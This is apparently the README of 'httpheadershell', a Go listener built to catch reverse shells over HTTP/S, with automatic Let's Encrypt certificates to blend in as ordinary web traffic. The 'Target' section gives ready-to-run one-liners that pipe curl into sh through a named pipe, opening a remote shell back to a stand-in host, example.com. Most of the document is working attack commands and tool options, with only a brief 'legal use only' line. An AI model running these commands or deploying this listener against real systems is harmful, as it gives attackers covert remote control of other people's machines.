HTTP Header Shell
=================
Simple little HTTP server used for catching one-off shells.  More or less just
a proxy between HTTP requests and stdio.

For legal use only.

Features
--------
- Proxy stdio to an HTTP/s client
- Configurable(ish) HTTP URL path
- Automatic TLS certificate provisioning with Let's Encrypt
- HTTP verb agnostic

Quickstart
----------
Server
```sh
go install github.com/magisterquis/httpheadershell@latest
./httpheadershell -letsencrypt example.com
```
Target
```sh
[[ -p ./f ]] && rm ./f; mkfifo ./f && curl -sNT. https://example.com/httpheadershell-b <./f | sh >./f 2>&1

# ...or...

curl -sN https://example.com/httpheadershell-i | sh 2>&1 | curl -sT. https://example.com/httpheadershell-o
```

Usage
-----
```
Usage: /tmp/go-build3385381189/b001/exe/httpheadershell [options]

Proxies stdio to HTTP clients, meant for catching shells but with real HTTP
headers on the wire.

URL Paths:

/httpheadershell-i - Stdin will be sent via the body of the response
/httpheadershell-o - Request body will be written to stdout
/httpheadershell-e - Request body will be written to stderr
/httpheadershell-b - Stdin will be sent via the body of the response AND
                     Request body will be written to stdout

Use of -letsencrypt constitutes accepting Let's Encrypt's terms and conditions.

Options:
  -cert file
    	Optional TLS certificate file
  -email address
    	Optional email address for Let's Encrypt certificate provisioning
  -key file
    	Optional TLS key file
  -lecache directory
    	Let's Encrypt certificate cache directory (default ".httpheadershell.certs")
  -letsencrypt whitelist
    	Comma-separated Let's Encrypt certificate provisoning whitelist
  -listen address
    	Listen address (default "0.0.0.0:443")
  -path prefix
    	Stdio proxy URL path prefix (default "/httpheadershell-")
  -plaintext
    	Serve plaintext HTTP, not HTTPS
  -staging
    	Use Let's Encrypt's staging server
```
